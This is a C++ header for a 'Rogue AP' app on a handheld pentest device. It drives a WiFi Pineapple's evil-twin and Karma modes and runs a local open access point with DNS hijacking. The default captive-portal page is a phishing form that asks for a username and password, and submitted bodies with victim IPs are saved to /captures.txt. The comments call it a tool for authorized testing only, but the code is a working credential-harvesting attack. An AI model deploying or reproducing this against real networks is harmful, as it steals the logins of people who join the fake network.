#pragma once
// RogueApApp — three rogue-AP modes behind one app, Tab cycles:
//
//   EvilTwin  Pineapple PineAP rogue-AP toggle + SSID pool wipe
//   Karma     Pineapple Karma probe-responder toggle
//   Captive   Local SoftAP + DNS hijack + HTML phishing capture
//
// EvilTwin and Karma drive a remote Pineapple over HTTP. Captive runs
// a SoftAP on the Cardputer's onboard radio. Switching modes shuts
// down any running Captive SoftAP cleanly.
//
// Use only on networks you own or are authorized to test. Held-key
// (Fn+Enter) for any action that arms a mode.
#include "yui/app/App.hpp"
#include "yui/hal/IFs.hpp"
#include "yui/hal/IStorage.hpp"
#include "yui/hal/IWifiAp.hpp"
#include "yui/proto/Pineapple.hpp"
#include "yui/types.hpp"
#include "yui/ui/Chrome.hpp"
#include "yui/ui/Tokens.hpp"
#include <cstdio>
#include <cstring>

namespace yui {

class RogueApApp : public App {
 public:
  enum class Mode { EvilTwin, Karma, Captive };
  enum class CaptiveState : uint8_t { Idle, Starting, Running, Stopped };

  static constexpr size_t kMaxCaptures = 16;
  static constexpr size_t kHtmlCap     = 1024;

  struct Capture {
    char peer_ip[16] = {0};
    char body[160]   = {0};
  };

  RogueApApp(IHttp& http, IStorage& store, IWifiAp& ap, IFs& fs)
      : pa_(http, &store), store_(store), ap_(ap), fs_(fs) {}

  const char* name() const override { return "Rogue AP"; }
  Category    category() const override { return Category::WiFi; }
  const assets::IconRef* icon() const override { return &assets::icons::kSpoof(); }

  void on_enter(Hal& hal) override {
    hal_ = &hal;
    et_enabled_ = false; et_last_ok_ = false; et_last_action_ = ETAction::None;
    karma_enabled_ = false; karma_last_ok_ = false;
    cap_state_ = CaptiveState::Idle;
    capture_count_ = 0;
    load_html_();
    load_ssid_();
  }

  void on_exit() override {
    if (cap_state_ == CaptiveState::Running) ap_.stop();
    cap_state_ = CaptiveState::Stopped;
  }

  void on_key(KeyEvent k) override {
    if (!k.down) return;
    if (k.key == Key::Tab && !k.fn) {
      cycle_mode_();
      return;
    }
    switch (mode_) {
      case Mode::EvilTwin: on_key_eviltwin_(k); break;
      case Mode::Karma:    on_key_karma_(k);    break;
      case Mode::Captive:  on_key_captive_(k);  break;
    }
  }

  void render(IDisplay& d) override {
    d.clear(ui::kSurface);
    const char* title = mode_ == Mode::EvilTwin ? "Rogue AP · EvilTwin"
                      : mode_ == Mode::Karma    ? "Rogue AP · Karma"
                                                : "Rogue AP · Captive";
    ui::Chrome::header(d, title);

    char line[40];
    int y = 22;
    switch (mode_) {
      case Mode::EvilTwin:
        std::snprintf(line, sizeof(line), "PineAP: %s",
                      et_enabled_ ? "ON" : "off");
        d.draw_text(8, y, line, et_enabled_ ? ui::kWarn : ui::kOnSurface,
                    ui::kSurface); y += 14;
        d.draw_text(8, y, "Fn+Enter: ENABLE",  ui::kAccent,     ui::kSurface); y += 14;
        d.draw_text(8, y, "Bksp:     disable", ui::kAccentDark, ui::kSurface); y += 14;
        d.draw_text(8, y, "Fn+Tab:   clear pool", ui::kAccentDark, ui::kSurface);
        if (et_last_action_ != ETAction::None) {
          y += 14;
          const char* a = et_last_action_ == ETAction::Enable  ? "Enable"
                       : et_last_action_ == ETAction::Disable ? "Disable" : "Clear";
          std::snprintf(line, sizeof(line), "%s: %s", a,
                        et_last_ok_ ? "ok" : "FAIL");
          d.draw_text(8, y, line, et_last_ok_ ? ui::kAccent : ui::kWarn,
                      ui::kSurface);
        }
        break;
      case Mode::Karma:
        std::snprintf(line, sizeof(line), "Karma: %s",
                      karma_enabled_ ? "ON" : "off");
        d.draw_text(8, y, line, karma_enabled_ ? ui::kWarn : ui::kOnSurface,
                    ui::kSurface); y += 18;
        d.draw_text(8, y, "Fn+Enter: ENABLE", ui::kAccent, ui::kSurface); y += 14;
        d.draw_text(8, y, "Backspace: disable", ui::kAccentDark, ui::kSurface);
        if (karma_last_ok_) {
          y += 18;
          d.draw_text(8, y, "Last action: ok", ui::kAccent, ui::kSurface);
        }
        break;
      case Mode::Captive:
        std::snprintf(line, sizeof(line), "SSID: %s",
                      ssid_[0] ? ssid_ : "(set cp.ssid)");
        d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 14;
        std::snprintf(line, sizeof(line), "State: %s",
                      cap_state_ == CaptiveState::Running ? "RUNNING"
                    : cap_state_ == CaptiveState::Starting ? "starting"
                    : cap_state_ == CaptiveState::Stopped  ? "stopped" : "idle");
        d.draw_text(8, y, line,
                    cap_state_ == CaptiveState::Running ? ui::kWarn : ui::kOnSurface,
                    ui::kSurface); y += 14;
        std::snprintf(line, sizeof(line),
                      "Clients:%u DNS:%u HTTP:%u",
                      static_cast<unsigned>(ap_.client_count()),
                      static_cast<unsigned>(ap_.dns_queries()),
                      static_cast<unsigned>(ap_.http_requests()));
        d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 14;
        std::snprintf(line, sizeof(line), "Captures: %u",
                      static_cast<unsigned>(capture_count_));
        d.draw_text(8, y, line,
                    capture_count_ > 0 ? ui::kAccent : ui::kAccentDark,
                    ui::kSurface);
        break;
    }
    ui::Chrome::footer(d, "Tab:mode  YOUR network only");
    d.flush();
  }

  // Test hooks
  Mode mode() const { return mode_; }
  void set_mode(Mode m) {
    if (m == mode_) return;
    if (mode_ == Mode::Captive && cap_state_ == CaptiveState::Running) {
      ap_.stop();
      cap_state_ = CaptiveState::Stopped;
    }
    mode_ = m;
  }
  // EvilTwin
  bool enabled() const { return mode_ == Mode::Karma ? karma_enabled_ : et_enabled_; }
  bool last_ok() const { return mode_ == Mode::Karma ? karma_last_ok_ : et_last_ok_; }
  bool eviltwin_enabled() const { return et_enabled_; }
  bool eviltwin_last_ok() const { return et_last_ok_; }
  // Karma
  bool karma_enabled()    const { return karma_enabled_; }
  bool karma_last_ok()    const { return karma_last_ok_; }
  // Captive
  CaptiveState state()        const { return cap_state_; }
  size_t       capture_count() const { return capture_count_; }
  const Capture& capture_at(size_t i) const { return captures_[i]; }
  void set_ssid(const char* s) {
    if (!s) return;
    std::strncpy(ssid_, s, sizeof(ssid_) - 1);
    ssid_[sizeof(ssid_) - 1] = '\0';
  }

 private:
  enum class ETAction { None, Enable, Disable, Clear };

  void cycle_mode_() {
    Mode next = mode_ == Mode::EvilTwin ? Mode::Karma
              : mode_ == Mode::Karma    ? Mode::Captive
                                        : Mode::EvilTwin;
    set_mode(next);
  }

  void on_key_eviltwin_(KeyEvent k) {
    if (k.key == Key::Enter && k.fn) {
      et_last_ok_ = ensure_pa_authed_() && pa_.pineap_set_enabled(true, false);
      et_enabled_ = et_last_ok_;
      et_last_action_ = ETAction::Enable;
    } else if (k.key == Key::Backspace) {
      et_last_ok_ = ensure_pa_authed_() && pa_.pineap_set_enabled(false, false);
      if (et_last_ok_) et_enabled_ = false;
      et_last_action_ = ETAction::Disable;
    } else if (k.key == Key::Tab && k.fn) {
      // (Tab alone cycles modes; Fn+Tab triggers the EvilTwin clear-pool action.)
      et_last_ok_ = ensure_pa_authed_() && pa_.pineap_clear_ssids();
      et_last_action_ = ETAction::Clear;
    }
  }

  void on_key_karma_(KeyEvent k) {
    if (k.key == Key::Enter && k.fn) {
      karma_last_ok_ = ensure_pa_authed_() && pa_.pineap_set_enabled(true, true);
      karma_enabled_ = karma_last_ok_;
    } else if (k.key == Key::Backspace) {
      karma_last_ok_ = ensure_pa_authed_() && pa_.pineap_set_enabled(true, false);
      if (karma_last_ok_) karma_enabled_ = false;
    }
  }

  void on_key_captive_(KeyEvent k) {
    if (k.key == Key::Enter && k.fn) start_captive_();
    else if (k.key == Key::Backspace) stop_captive_();
    else if (k.key == Key::Tab && k.fn) flush_captures_to_sd_();
  }

  static void capture_thunk_(void* ctx, const char* peer_ip, const char* body) {
    static_cast<RogueApApp*>(ctx)->on_capture_(peer_ip, body);
  }

  void on_capture_(const char* peer_ip, const char* body) {
    if (capture_count_ >= kMaxCaptures) return;
    Capture& c = captures_[capture_count_++];
    std::strncpy(c.peer_ip, peer_ip ? peer_ip : "?", sizeof(c.peer_ip) - 1);
    std::strncpy(c.body,    body    ? body    : "", sizeof(c.body) - 1);
  }

  void start_captive_() {
    if (cap_state_ == CaptiveState::Running || ssid_[0] == 0) return;
    cap_state_ = CaptiveState::Starting;
    if (!ap_.start_open(ssid_, channel_)) { cap_state_ = CaptiveState::Stopped; return; }
    if (!ap_.start_captive(html_, &capture_thunk_, this)) {
      ap_.stop();
      cap_state_ = CaptiveState::Stopped;
      return;
    }
    cap_state_ = CaptiveState::Running;
  }

  void stop_captive_() {
    if (cap_state_ != CaptiveState::Running &&
        cap_state_ != CaptiveState::Starting) return;
    ap_.stop();
    cap_state_ = CaptiveState::Stopped;
  }

  void flush_captures_to_sd_() {
    if (capture_count_ == 0) return;
    fs_.init();
    char path[40]; std::snprintf(path, sizeof(path), "/captures.txt");
    char out[kHtmlCap];
    int off = 0;
    for (size_t i = 0; i < capture_count_; ++i) {
      off += std::snprintf(out + off, sizeof(out) - off, "%s\t%s\n",
                           captures_[i].peer_ip, captures_[i].body);
      if (off >= static_cast<int>(sizeof(out)) - 64) break;
    }
    fs_.write_all(path, out, static_cast<size_t>(off));
  }

  void load_html_() {
    char buf[kHtmlCap] = {0};
    if (store_.get_str("cp.html", buf, sizeof(buf)) && buf[0]) {
      std::strncpy(html_, buf, sizeof(html_) - 1);
      html_[sizeof(html_) - 1] = '\0';
      return;
    }
    static const char kDefault[] =
      "<!doctype html><meta charset=utf-8><title>WiFi Portal</title>"
      "<form method=POST action=/login>"
      "<h2>Sign in to continue</h2>"
      "<input name=u placeholder=Username><br>"
      "<input name=p type=password placeholder=Password><br>"
      "<button>Sign in</button></form>";
    std::strncpy(html_, kDefault, sizeof(html_) - 1);
  }

  void load_ssid_() {
    char buf[33] = {0};
    if (store_.get_str("cp.ssid", buf, sizeof(buf)) && buf[0]) set_ssid(buf);
  }

  bool ensure_pa_authed_() {
    if (pa_.authenticated()) return true;
    char host[64] = {0};
    if (!store_.get_str("pa.host", host, sizeof(host)) || host[0] == 0) return false;
    int32_t port = 1471;
    store_.get_int("pa.port", port, 1471);
    char user[40] = {0}, pass[40] = {0};
    store_.get_str("pa.user", user, sizeof(user));
    store_.get_str("pa.pass", pass, sizeof(pass));
    return pa_.login(host, static_cast<uint16_t>(port), user, pass);
  }

  pineapple::Client pa_;
  IStorage&         store_;
  IWifiAp&          ap_;
  IFs&              fs_;
  Hal*              hal_  = nullptr;
  Mode              mode_ = Mode::EvilTwin;
  // EvilTwin
  bool              et_enabled_     = false;
  bool              et_last_ok_     = false;
  ETAction          et_last_action_ = ETAction::None;
  // Karma
  bool              karma_enabled_  = false;
  bool              karma_last_ok_  = false;
  // Captive
  CaptiveState      cap_state_      = CaptiveState::Idle;
  uint8_t           channel_        = 6;
  char              ssid_[33]       = {0};
  char              html_[kHtmlCap] = {0};
  Capture           captures_[kMaxCaptures];
  size_t            capture_count_  = 0;
};

}  // namespace yui
